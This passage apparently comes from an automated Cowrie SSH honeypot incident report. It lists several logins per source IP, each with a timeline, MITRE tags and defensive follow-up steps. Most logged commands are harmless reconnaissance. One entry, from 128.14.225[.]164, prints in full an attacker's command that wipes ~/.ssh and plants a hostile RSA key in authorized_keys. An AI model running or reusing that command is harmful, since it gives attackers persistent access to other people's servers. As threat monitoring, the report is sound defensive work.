| `2026-08-04 09:33:05` | `cowrie.client.version` |
| `2026-08-04 09:33:05` | `cowrie.client.kex` |
| `2026-08-04 09:33:06` | `cowrie.login.success` |
| `2026-08-04 09:33:07` | `cowrie.direct-tcpip.request` |
| `2026-08-04 09:33:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.55.122[.]202` to AbuseIPDB if not already reported
- [ ] Block `2.55.122[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9af455f2af8

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 09:40 |
| **Last Seen** | 2026-08-04 09:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 09:40:34` | `cowrie.session.connect` |
| `2026-08-04 09:40:34` | `cowrie.client.version` |
| `2026-08-04 09:40:34` | `cowrie.client.kex` |
| `2026-08-04 09:40:35` | `cowrie.login.success` |
| `2026-08-04 09:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d29606ac267f

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 09:40 |
| **Last Seen** | 2026-08-04 09:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 09:40:35` | `cowrie.session.connect` |
| `2026-08-04 09:40:35` | `cowrie.client.version` |
| `2026-08-04 09:40:35` | `cowrie.client.kex` |
| `2026-08-04 09:40:35` | `cowrie.login.success` |
| `2026-08-04 09:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bb904b4b4a1

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 09:40 |
| **Last Seen** | 2026-08-04 09:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 09:40:37` | `cowrie.session.connect` |
| `2026-08-04 09:40:37` | `cowrie.client.version` |
| `2026-08-04 09:40:37` | `cowrie.client.kex` |
| `2026-08-04 09:40:38` | `cowrie.login.success` |
| `2026-08-04 09:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b68a19fd21d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 09:40 |
| **Last Seen** | 2026-08-04 09:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 09:40:38` | `cowrie.session.connect` |
| `2026-08-04 09:40:38` | `cowrie.client.version` |
| `2026-08-04 09:40:38` | `cowrie.client.kex` |
| `2026-08-04 09:40:39` | `cowrie.login.success` |
| `2026-08-04 09:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e282b04d730

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-04 09:47 |
| **Last Seen** | 2026-08-04 09:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 09:47:31` | `cowrie.session.connect` |
| `2026-08-04 09:47:31` | `cowrie.client.version` |
| `2026-08-04 09:47:31` | `cowrie.client.kex` |
| `2026-08-04 09:47:32` | `cowrie.login.success` |
| `2026-08-04 09:47:32` | `cowrie.direct-tcpip.request` |
| `2026-08-04 09:47:32` | `cowrie.direct-tcpip.data` |
| `2026-08-04 09:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e09415695090

| Field | Detail |
|---|---|
| **Source IP** | `68.183.68[.]14` |
| **First Seen** | 2026-08-04 10:01 |
| **Last Seen** | 2026-08-04 10:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:01:17` | `cowrie.session.connect` |
| `2026-08-04 10:01:17` | `cowrie.login.success` |
| `2026-08-04 10:01:17` | `cowrie.session.params` |
| `2026-08-04 10:01:17` | `cowrie.command.input` |
| `2026-08-04 10:01:17` | `cowrie.command.failed` |
| `2026-08-04 10:01:17` | `cowrie.command.input` |
| `2026-08-04 10:01:17` | `cowrie.command.failed` |
| `2026-08-04 10:01:17` | `cowrie.command.input` |
| `2026-08-04 10:01:17` | `cowrie.log.closed` |
| `2026-08-04 10:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.68[.]14` to AbuseIPDB if not already reported
- [ ] Block `68.183.68[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-743e0678691b

| Field | Detail |
|---|---|
| **Source IP** | `68.183.68[.]14` |
| **First Seen** | 2026-08-04 10:01 |
| **Last Seen** | 2026-08-04 10:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:01:17` | `cowrie.session.connect` |
| `2026-08-04 10:01:17` | `cowrie.login.success` |
| `2026-08-04 10:01:18` | `cowrie.session.params` |
| `2026-08-04 10:01:18` | `cowrie.command.input` |
| `2026-08-04 10:01:18` | `cowrie.command.failed` |
| `2026-08-04 10:01:18` | `cowrie.command.input` |
| `2026-08-04 10:01:18` | `cowrie.command.failed` |
| `2026-08-04 10:01:18` | `cowrie.command.input` |
| `2026-08-04 10:01:18` | `cowrie.log.closed` |
| `2026-08-04 10:01:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.68[.]14` to AbuseIPDB if not already reported
- [ ] Block `68.183.68[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2db587f68073

| Field | Detail |
|---|---|
| **Source IP** | `68.183.68[.]14` |
| **First Seen** | 2026-08-04 10:01 |
| **Last Seen** | 2026-08-04 10:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:01:18` | `cowrie.session.connect` |
| `2026-08-04 10:01:18` | `cowrie.login.success` |
| `2026-08-04 10:01:19` | `cowrie.session.params` |
| `2026-08-04 10:01:19` | `cowrie.command.input` |
| `2026-08-04 10:01:19` | `cowrie.command.failed` |
| `2026-08-04 10:01:19` | `cowrie.command.input` |
| `2026-08-04 10:01:19` | `cowrie.command.failed` |
| `2026-08-04 10:01:19` | `cowrie.command.input` |
| `2026-08-04 10:01:19` | `cowrie.log.closed` |
| `2026-08-04 10:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.68[.]14` to AbuseIPDB if not already reported
- [ ] Block `68.183.68[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf63bf75f952

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-08-04 10:07 |
| **Last Seen** | 2026-08-04 10:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:07:56` | `cowrie.session.connect` |
| `2026-08-04 10:07:57` | `cowrie.client.version` |
| `2026-08-04 10:07:57` | `cowrie.client.kex` |
| `2026-08-04 10:07:59` | `cowrie.login.success` |
| `2026-08-04 10:08:00` | `cowrie.direct-tcpip.request` |
| `2026-08-04 10:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f22e4fcc33b2

| Field | Detail |
|---|---|
| **Source IP** | `31.77.227[.]120` |
| **First Seen** | 2026-08-04 10:13 |
| **Last Seen** | 2026-08-04 10:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:13:09` | `cowrie.session.connect` |
| `2026-08-04 10:13:09` | `cowrie.client.version` |
| `2026-08-04 10:13:09` | `cowrie.client.kex` |
| `2026-08-04 10:13:09` | `cowrie.login.success` |
| `2026-08-04 10:13:10` | `cowrie.session.params` |
| `2026-08-04 10:13:10` | `cowrie.command.input` |
| `2026-08-04 10:13:10` | `cowrie.log.closed` |
| `2026-08-04 10:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.77.227[.]120` to AbuseIPDB if not already reported
- [ ] Block `31.77.227[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-605ee1ae5377

| Field | Detail |
|---|---|
| **Source IP** | `218.206.136[.]24` |
| **First Seen** | 2026-08-04 10:14 |
| **Last Seen** | 2026-08-04 10:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:14:05` | `cowrie.session.connect` |
| `2026-08-04 10:14:06` | `cowrie.client.version` |
| `2026-08-04 10:14:06` | `cowrie.client.kex` |
| `2026-08-04 10:14:08` | `cowrie.login.success` |
| `2026-08-04 10:14:08` | `cowrie.direct-tcpip.request` |
| `2026-08-04 10:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.206.136[.]24` to AbuseIPDB if not already reported
- [ ] Block `218.206.136[.]24` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-204c349a6bcf

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]82` |
| **First Seen** | 2026-08-04 10:14 |
| **Last Seen** | 2026-08-04 10:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:14:18` | `cowrie.session.connect` |
| `2026-08-04 10:14:19` | `cowrie.client.version` |
| `2026-08-04 10:14:19` | `cowrie.client.kex` |
| `2026-08-04 10:14:22` | `cowrie.login.success` |
| `2026-08-04 10:14:23` | `cowrie.direct-tcpip.request` |
| `2026-08-04 10:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d60aa9b225e

| Field | Detail |
|---|---|
| **Source IP** | `60.12.5[.]190` |
| **First Seen** | 2026-08-04 10:30 |
| **Last Seen** | 2026-08-04 10:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:30:44` | `cowrie.session.connect` |
| `2026-08-04 10:30:45` | `cowrie.client.version` |
| `2026-08-04 10:30:45` | `cowrie.client.kex` |
| `2026-08-04 10:30:47` | `cowrie.login.success` |
| `2026-08-04 10:30:48` | `cowrie.direct-tcpip.request` |
| `2026-08-04 10:30:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.12.5[.]190` to AbuseIPDB if not already reported
- [ ] Block `60.12.5[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37755ede52a0

| Field | Detail |
|---|---|
| **Source IP** | `172.236.228[.]222` |
| **First Seen** | 2026-08-04 10:31 |
| **Last Seen** | 2026-08-04 10:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:31:44` | `cowrie.session.connect` |
| `2026-08-04 10:31:44` | `cowrie.login.success` |
| `2026-08-04 10:31:45` | `cowrie.session.params` |
| `2026-08-04 10:31:45` | `cowrie.command.input` |
| `2026-08-04 10:31:45` | `cowrie.command.input` |
| `2026-08-04 10:31:45` | `cowrie.command.failed` |
| `2026-08-04 10:31:45` | `cowrie.command.input` |
| `2026-08-04 10:31:45` | `cowrie.command.failed` |
| `2026-08-04 10:31:45` | `cowrie.command.input` |
| `2026-08-04 10:31:45` | `cowrie.log.closed` |
| `2026-08-04 10:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.228[.]222` to AbuseIPDB if not already reported
- [ ] Block `172.236.228[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd65eb7158ea

| Field | Detail |
|---|---|
| **Source IP** | `101.96.225[.]252` |
| **First Seen** | 2026-08-04 10:35 |
| **Last Seen** | 2026-08-04 10:37 |
| **Session Duration** | 86s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:35:40` | `cowrie.session.connect` |
| `2026-08-04 10:35:40` | `cowrie.client.version` |
| `2026-08-04 10:35:41` | `cowrie.client.kex` |
| `2026-08-04 10:37:06` | `cowrie.login.success` |
| `2026-08-04 10:37:07` | `cowrie.session.params` |
| `2026-08-04 10:37:07` | `cowrie.command.input` |
| `2026-08-04 10:37:07` | `cowrie.log.closed` |
| `2026-08-04 10:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.225[.]252` to AbuseIPDB if not already reported
- [ ] Block `101.96.225[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd8bba0171e0

| Field | Detail |
|---|---|
| **Source IP** | `203.192.211[.]180` |
| **First Seen** | 2026-08-04 10:39 |
| **Last Seen** | 2026-08-04 10:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:39:41` | `cowrie.session.connect` |
| `2026-08-04 10:39:42` | `cowrie.client.version` |
| `2026-08-04 10:39:42` | `cowrie.client.kex` |
| `2026-08-04 10:39:44` | `cowrie.login.success` |
| `2026-08-04 10:39:44` | `cowrie.direct-tcpip.request` |
| `2026-08-04 10:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.211[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.192.211[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90ec5ad3c00c

| Field | Detail |
|---|---|
| **Source IP** | `185.15.189[.]232` |
| **First Seen** | 2026-08-04 10:47 |
| **Last Seen** | 2026-08-04 10:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:47:58` | `cowrie.session.connect` |
| `2026-08-04 10:47:58` | `cowrie.client.version` |
| `2026-08-04 10:47:58` | `cowrie.client.kex` |
| `2026-08-04 10:47:59` | `cowrie.login.success` |
| `2026-08-04 10:48:00` | `cowrie.direct-tcpip.request` |
| `2026-08-04 10:48:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.15.189[.]232` to AbuseIPDB if not already reported
- [ ] Block `185.15.189[.]232` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c46d841d427

| Field | Detail |
|---|---|
| **Source IP** | `178.214.160[.]4` |
| **First Seen** | 2026-08-04 10:48 |
| **Last Seen** | 2026-08-04 10:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:48:05` | `cowrie.session.connect` |
| `2026-08-04 10:48:05` | `cowrie.client.version` |
| `2026-08-04 10:48:05` | `cowrie.client.kex` |
| `2026-08-04 10:48:06` | `cowrie.login.success` |
| `2026-08-04 10:48:06` | `cowrie.direct-tcpip.request` |
| `2026-08-04 10:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.214.160[.]4` to AbuseIPDB if not already reported
- [ ] Block `178.214.160[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-accb82185ac3

| Field | Detail |
|---|---|
| **Source IP** | `219.89.206[.]236` |
| **First Seen** | 2026-08-04 10:48 |
| **Last Seen** | 2026-08-04 10:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:48:53` | `cowrie.session.connect` |
| `2026-08-04 10:48:54` | `cowrie.client.version` |
| `2026-08-04 10:48:54` | `cowrie.client.kex` |
| `2026-08-04 10:48:56` | `cowrie.login.success` |
| `2026-08-04 10:48:57` | `cowrie.direct-tcpip.request` |
| `2026-08-04 10:49:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.89.206[.]236` to AbuseIPDB if not already reported
- [ ] Block `219.89.206[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b833463003f6

| Field | Detail |
|---|---|
| **Source IP** | `111.70.7[.]189` |
| **First Seen** | 2026-08-04 10:49 |
| **Last Seen** | 2026-08-04 10:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:49:02` | `cowrie.session.connect` |
| `2026-08-04 10:49:03` | `cowrie.client.version` |
| `2026-08-04 10:49:03` | `cowrie.client.kex` |
| `2026-08-04 10:49:05` | `cowrie.login.success` |
| `2026-08-04 10:49:06` | `cowrie.direct-tcpip.request` |
| `2026-08-04 10:49:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.7[.]189` to AbuseIPDB if not already reported
- [ ] Block `111.70.7[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a187abc7f591

| Field | Detail |
|---|---|
| **Source IP** | `43.226.38[.]71` |
| **First Seen** | 2026-08-04 10:51 |
| **Last Seen** | 2026-08-04 10:53 |
| **Session Duration** | 145s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:51:32` | `cowrie.session.connect` |
| `2026-08-04 10:51:35` | `cowrie.client.version` |
| `2026-08-04 10:51:49` | `cowrie.client.kex` |
| `2026-08-04 10:53:29` | `cowrie.login.success` |
| `2026-08-04 10:53:45` | `cowrie.session.params` |
| `2026-08-04 10:53:45` | `cowrie.command.input` |
| `2026-08-04 10:53:57` | `cowrie.log.closed` |
| `2026-08-04 10:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.226.38[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.226.38[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf9fedc9c58b

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-08-04 10:51 |
| **Last Seen** | 2026-08-04 10:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:51:41` | `cowrie.session.connect` |
| `2026-08-04 10:51:41` | `cowrie.client.version` |
| `2026-08-04 10:51:41` | `cowrie.client.kex` |
| `2026-08-04 10:51:41` | `cowrie.login.success` |
| `2026-08-04 10:51:42` | `cowrie.session.params` |
| `2026-08-04 10:51:42` | `cowrie.command.input` |
| `2026-08-04 10:51:42` | `cowrie.command.failed` |
| `2026-08-04 10:51:42` | `cowrie.log.closed` |
| `2026-08-04 10:51:43` | `cowrie.session.params` |
| `2026-08-04 10:51:43` | `cowrie.command.input` |
| `2026-08-04 10:51:43` | `cowrie.session.file_download` |
| `2026-08-04 10:51:43` | `cowrie.log.closed` |
| `2026-08-04 10:51:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3de827022beb

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-08-04 10:51 |
| **Last Seen** | 2026-08-04 10:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:51:43` | `cowrie.session.connect` |
| `2026-08-04 10:51:43` | `cowrie.client.version` |
| `2026-08-04 10:51:43` | `cowrie.client.kex` |
| `2026-08-04 10:51:44` | `cowrie.login.success` |
| `2026-08-04 10:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-849d989209c4

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-08-04 10:51 |
| **Last Seen** | 2026-08-04 10:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:51:44` | `cowrie.session.connect` |
| `2026-08-04 10:51:44` | `cowrie.client.version` |
| `2026-08-04 10:51:44` | `cowrie.client.kex` |
| `2026-08-04 10:51:44` | `cowrie.login.success` |
| `2026-08-04 10:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b61d2c357861

| Field | Detail |
|---|---|
| **Source IP** | `209.38.121[.]186` |
| **First Seen** | 2026-08-04 10:54 |
| **Last Seen** | 2026-08-04 10:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
